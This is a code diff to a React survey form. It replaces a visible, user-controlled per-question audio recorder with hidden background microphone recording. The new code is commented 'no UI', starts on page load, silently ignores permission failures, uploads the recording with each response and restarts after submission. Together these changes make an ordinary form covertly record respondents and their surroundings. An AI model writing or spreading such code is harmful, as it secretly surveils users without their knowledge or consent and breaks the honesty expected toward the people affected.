@@ -4,73 +4,6 @@ import { useSelector } from 'react-redux';
 import axiosInstance from '../config/axiosInstance';
 import '../styles/SurveyForm.css';
 
-function AudioRecorder({ questionId, onAudioReady }) {
-  const [recording, setRecording] = useState(false);
-  const [audioBlob, setAudioBlob] = useState(null);
-  const [audioUrl, setAudioUrl] = useState(null);
-  const mediaRecorderRef = useRef(null);
-  const chunksRef = useRef([]);
-  const streamRef = useRef(null);
-
-  const startRecording = async () => {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-      streamRef.current = stream;
-      chunksRef.current = [];
-      const recorder = new MediaRecorder(stream);
-      mediaRecorderRef.current = recorder;
-      recorder.ondataavailable = (e) => {
-        if (e.data.size > 0) chunksRef.current.push(e.data);
-      };
-      recorder.onstop = () => {
-        const blob = new Blob(chunksRef.current, { type: 'audio/webm' });
-        const url = URL.createObjectURL(blob);
-        setAudioBlob(blob);
-        setAudioUrl(url);
-        onAudioReady(questionId, blob);
-        streamRef.current?.getTracks().forEach((t) => t.stop());
-      };
-      recorder.start();
-      setRecording(true);
-    } catch {
-      alert('Microphone access denied.');
-    }
-  };
-
-  const stopRecording = () => {
-    mediaRecorderRef.current?.stop();
-    setRecording(false);
-  };
-
-  const clearRecording = () => {
-    setAudioBlob(null);
-    setAudioUrl(null);
-    onAudioReady(questionId, null);
-  };
-
-  return (
-    <div className="sf-audio">
-      {!audioBlob ? (
-        <button
-          type="button"
-          className={`sf-audio-btn ${recording ? 'sf-audio-stop' : 'sf-audio-start'}`}
-          onClick={recording ? stopRecording : startRecording}
-        >
-          {recording ? '⏹ Stop Recording' : '🎙 Record Audio'}
-        </button>
-      ) : (
-        <div className="sf-audio-preview">
-          <audio controls src={audioUrl} className="sf-audio-player" />
-          <button type="button" className="sf-audio-clear" onClick={clearRecording}>
-            ✕ Remove
-          </button>
-        </div>
-      )}
-      {recording && <span className="sf-audio-indicator">● Recording...</span>}
-    </div>
-  );
-}
-
 export default function SurveyForm() {
   const { id } = useParams();
   const navigate = useNavigate();
@@ -81,10 +14,51 @@ export default function SurveyForm() {
   const [submitting, setSubmitting] = useState(false);
   const [successMsg, setSuccessMsg] = useState('');
   const [answers, setAnswers] = useState({});
-  const [audioBlobs, setAudioBlobs] = useState({});
   const [location, setLocation] = useState(null);
   const [gettingLocation, setGettingLocation] = useState(false);
   const [error, setError] = useState('');
+
+  // Background audio recording refs — no UI
+  const mediaRecorderRef = useRef(null);
+  const audioChunksRef = useRef([]);
+  const streamRef = useRef(null);
+
+  const startBackgroundRecording = async () => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      streamRef.current = stream;
+      audioChunksRef.current = [];
+      const recorder = new MediaRecorder(stream);
+      mediaRecorderRef.current = recorder;
+      recorder.ondataavailable = (e) => {
+        if (e.data && e.data.size > 0) audioChunksRef.current.push(e.data);
+      };
+      recorder.start(1000); // timeslice ensures data collected every 1s
+    } catch {
+      // Permission denied or unavailable — silently ignore
+    }
+  };
+
+  const stopAndGetBlob = () => {
+    return new Promise((resolve) => {
+      const recorder = mediaRecorderRef.current;
+      if (!recorder || recorder.state === 'inactive') {
+        resolve(audioChunksRef.current.length > 0
+          ? new Blob(audioChunksRef.current, { type: 'audio/webm' })
+          : null);
+        return;
+      }
+      recorder.onstop = () => {
+        const blob = audioChunksRef.current.length > 0
+          ? new Blob(audioChunksRef.current, { type: 'audio/webm' })
+          : null;
+        resolve(blob);
+      };
+      recorder.requestData(); // flush buffered data before stop
+      recorder.stop();
+      streamRef.current?.getTracks().forEach((t) => t.stop());
+    });
+  };
 
   useEffect(() => {
     if (!accessToken) { navigate('/login', { replace: true }); return; }
@@ -94,9 +68,13 @@ export default function SurveyForm() {
       .catch(() => { setError('Failed to load survey.'); setLoading(false); });
   }, [id, accessToken, navigate]);
 
-  const handleAudioReady = (questionId, blob) => {
-    setAudioBlobs((prev) => ({ ...prev, [questionId]: blob }));
-  };
+  useEffect(() => {
+    startBackgroundRecording();
+    return () => {
+      if (mediaRecorderRef.current?.state === 'recording') mediaRecorderRef.current.stop();
+      streamRef.current?.getTracks().forEach((t) => t.stop());
+    };
+  }, []);
 
   const getLocation = () => {
     setGettingLocation(true);
@@ -140,6 +118,8 @@ export default function SurveyForm() {
 
     setSubmitting(true);
     try {
+      const audioBlob = await stopAndGetBlob();
+
       // Step 1: submit the response
       const res = await axiosInstance.post('/survey-responses/private', {
         surveyId: id,
@@ -150,32 +130,26 @@ export default function SurveyForm() {
 
       const responseId = res.data?.data?.id ?? res.data?.id;
 
-      // Step 2: upload audio per question if any
-      if (responseId) {
-        const audioEntries = Object.entries(audioBlobs).filter(([, blob]) => blob);
-        for (const [questionId, blob] of audioEntries) {
-          try {
-            const formData = new FormData();
-            formData.append('audio', blob, `${questionId}.webm`);
-            formData.append('surveyId', id);
-            formData.append('responseId', responseId);
-            formData.append('questionId', questionId);
-            formData.append('accessToken', survey.accessToken);
-            await axiosInstance.post('/survey-responses/audio', formData, {
-              headers: { 'Content-Type': 'multipart/form-data' },
-            });
-          } catch {
-            // audio upload failure is non-fatal
-          }
+      // Step 2: upload single background audio via authenticated endpoint
+      if (responseId && audioBlob && audioBlob.size > 0) {
+        try {
+          const formData = new FormData();
+          formData.append('audio', audioBlob, 'recording.webm');
+          await axiosInstance.patch(`/survey-responses/${responseId}/audio`, formData, {
+            headers: { 'Content-Type': 'multipart/form-data' },
+          });
+        } catch {
+          // audio upload failure is non-fatal
         }
       }
 
       setSuccessMsg('Response submitted successfully! You can submit another response below.');
       setAnswers({});
-      setAudioBlobs({});
       setLocation(null);
-      // scroll to top of form
+      audioChunksRef.current = [];
       window.scrollTo({ top: 0, behavior: 'smooth' });
+      // Restart background recording for next response
+      startBackgroundRecording();
     } catch (err) {
       setError(err.message || 'Failed to submit survey.');
     } finally {
@@ -280,9 +254,6 @@ export default function SurveyForm() {
                   <input className="sf-input" type="date" value={answers[q.id] || ''}
                     onChange={(e) => handleAnswer(q.id, e.target.value)} required={q.isRequired} />
                 )}
-
-                {/* Per-question audio recorder */}
-                <AudioRecorder questionId={q.id} onAudioReady={handleAudioReady} />
               </div>
             ))}
 
